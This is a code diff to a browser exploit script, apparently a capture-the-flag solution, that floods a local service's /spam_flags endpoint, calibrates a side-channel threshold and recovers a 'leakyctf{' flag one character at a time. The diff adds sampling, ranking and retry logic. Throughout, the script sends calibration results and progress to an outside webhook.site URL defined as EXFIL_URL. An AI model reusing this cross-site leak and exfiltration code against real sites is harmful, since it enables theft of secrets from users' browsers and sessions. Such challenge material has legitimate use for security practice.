@@ -60,10 +60,12 @@
     <script>
         const TARGET = "http://localhost:5000";
         const HEX = "0123456789abcdef";
-        const SPAM_SIZE = 100000;
-        const SPAM_ROUNDS = 9;
+        const SPAM_PLAN = [
+            100000, 100000, 100000, 100000, 100000,
+            100000, 100000, 100000, 100000, 99999
+        ];
         const SPAM_DELAY_MS = 1100;
-        const THRESHOLD_CANDIDATES = [40, 60, 80, 100, 120, 150, 180];
+        const THRESHOLD_CANDIDATES = [10, 20, 30, 40, 60, 80, 100, 120, 150];
         const PROBE_TIMEOUT_MS = 2000;
         const POST_PROBE_DELAY_MS = 180;
         const EXFIL_URL = "https://webhook.site/ccc7ad97-d6fb-4b7b-8668-90367280a72c";
@@ -104,10 +106,10 @@
         }
 
         async function inflateFlagList() {
-            log(`Starting amplification with ${SPAM_ROUNDS} calls to /spam_flags`);
-            for (let i = 0; i < SPAM_ROUNDS; i += 1) {
-                await fireAndForget(`${TARGET}/spam_flags?size=${SPAM_SIZE}`);
-                log(`spam_flags round ${i + 1}/${SPAM_ROUNDS}`);
+            log(`Starting amplification with ${SPAM_PLAN.length} calls to /spam_flags`);
+            for (let i = 0; i < SPAM_PLAN.length; i += 1) {
+                await fireAndForget(`${TARGET}/spam_flags?size=${SPAM_PLAN[i]}`);
+                log(`spam_flags round ${i + 1}/${SPAM_PLAN.length} size=${SPAM_PLAN[i]}`);
                 await sleep(SPAM_DELAY_MS);
             }
         }
@@ -160,13 +162,48 @@
 
         async function calibrate() {
             log("Calibrating threshold");
+            const calibrationRuns = [];
+
             for (const threshold of THRESHOLD_CANDIDATES) {
-                const fast = await probe("leakyctf{", threshold);
-                const slow = await probe("leakyctf{g", threshold);
-                log(`threshold=${threshold} fast=${fast} slow=${slow}`);
-                if (fast > slow && slow !== -1) {
-                    return { threshold, fast, slow };
+                const fastSamples = [
+                    await probe("leakyctf{", threshold),
+                    await probe("leakyctf{", threshold)
+                ];
+                const slowSamples = [
+                    await probe("leakyctf{g", threshold),
+                    await probe("leakyctf{g", threshold)
+                ];
+                const fastMin = Math.min(...fastSamples);
+                const slowMax = Math.max(...slowSamples);
+                const gap = fastMin - slowMax;
+
+                log(`threshold=${threshold} fast=${fastSamples.join(",")} slow=${slowSamples.join(",")} gap=${gap}`);
+                calibrationRuns.push({ threshold, fastMin, slowMax, gap });
+                if (fastMin > slowMax && slowMax !== -1) {
+                    return {
+                        threshold,
+                        commitValue: fastMin,
+                        baselineSlow: slowMax,
+                        calibrationRuns
+                    };
                 }
+            }
+
+            calibrationRuns.sort((a, b) => {
+                if (b.gap !== a.gap) {
+                    return b.gap - a.gap;
+                }
+                return a.threshold - b.threshold;
+            });
+
+            if (calibrationRuns.length > 0 && calibrationRuns[0].gap > 0) {
+                const best = calibrationRuns[0];
+                return {
+                    threshold: best.threshold,
+                    commitValue: best.fastMin,
+                    baselineSlow: best.slowMax,
+                    calibrationRuns
+                };
             }
 
             throw new Error("Could not find a working threshold");
@@ -178,17 +215,51 @@
                 const attempt = `${prefix}${ch}`;
                 const historyLength = await probe(attempt, calibration.threshold);
                 log(`probe ${attempt} -> ${historyLength}`);
-                if (historyLength > calibration.slow) {
+                if (historyLength >= calibration.commitValue) {
                     hits.push(ch);
                 }
             }
             return hits;
         }
 
+        async function tightenAmbiguousHits(prefix, hits, calibration) {
+            let candidates = [...hits];
+            for (const threshold of THRESHOLD_CANDIDATES) {
+                if (threshold >= calibration.threshold) {
+                    break;
+                }
+
+                const refined = [];
+                for (const ch of candidates) {
+                    const attempt = `${prefix}${ch}`;
+                    const historyLength = await probe(attempt, threshold);
+                    log(`retry threshold=${threshold} probe ${attempt} -> ${historyLength}`);
+                    if (historyLength >= calibration.commitValue) {
+                        refined.push(ch);
+                    }
+                }
+
+                if (refined.length === 1) {
+                    return refined;
+                }
+                if (refined.length > 0) {
+                    candidates = refined;
+                }
+            }
+
+            return candidates;
+        }
+
         async function recoverInternalFlag() {
             await inflateFlagList();
             const calibration = await calibrate();
-            log(`Using threshold=${calibration.threshold}, fast=${calibration.fast}, slow=${calibration.slow}`);
+            log(`Using threshold=${calibration.threshold}, commit=${calibration.commitValue}, slow=${calibration.baselineSlow}`);
+            beacon({
+                event: "calibrate",
+                threshold: String(calibration.threshold),
+                commit: String(calibration.commitValue),
+                slow: String(calibration.baselineSlow)
+            });
 
             let prefix = "leakyctf{";
             beacon({ event: "start", prefix, threshold: String(calibration.threshold) });
@@ -198,6 +269,10 @@
                 if (hits.length !== 1) {
                     log(`Ambiguous position ${position}, retrying once`);
                     hits = await scanPosition(prefix, calibration);
+                }
+                if (hits.length > 1) {
+                    log(`Position ${position} still ambiguous, tightening cutoff`);
+                    hits = await tightenAmbiguousHits(prefix, hits, calibration);
                 }
                 if (hits.length !== 1) {
                     throw new Error(`Position ${position} stayed ambiguous: ${hits.join(",") || "none"}`);
